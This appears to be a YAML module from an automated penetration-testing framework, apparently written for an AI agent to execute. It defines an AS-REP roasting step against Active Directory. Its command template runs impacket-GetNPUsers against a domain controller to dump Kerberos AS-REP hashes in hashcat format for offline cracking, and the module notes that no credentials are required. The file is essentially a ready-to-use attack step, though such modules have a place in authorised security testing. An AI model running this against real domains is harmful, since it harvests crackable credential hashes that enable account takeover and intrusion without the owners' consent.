name: asreproast
category: ad
description: Request AS-REP for accounts without Kerberos pre-authentication
preconditions:
  - service.port==88
  - domain_joined
parameters:
  target_ip: from_engagement.target_ip
  domain: from_engagement.domain
  username: from_cred.username
command_template: "impacket-GetNPUsers '{domain}/' -dc-ip {target_ip} -usersfile /tmp/users.txt -format hashcat -outputfile /tmp/asrep_hashes.txt"
parser: impacket_parser
expected_effects:
  - asrep_hashes_obtained
  - has_hash
falsifier:
  pattern: "No entries found|error"
  timeout: 45
model_tier: haiku
mechanism: "Requests AS-REP for accounts with DONT_REQUIRE_PREAUTH set. No credentials needed if you have usernames. Hashes are Kerberos 5 AS-REP (hashcat -m 18200). Rarer than Kerberoasting but requires no creds."
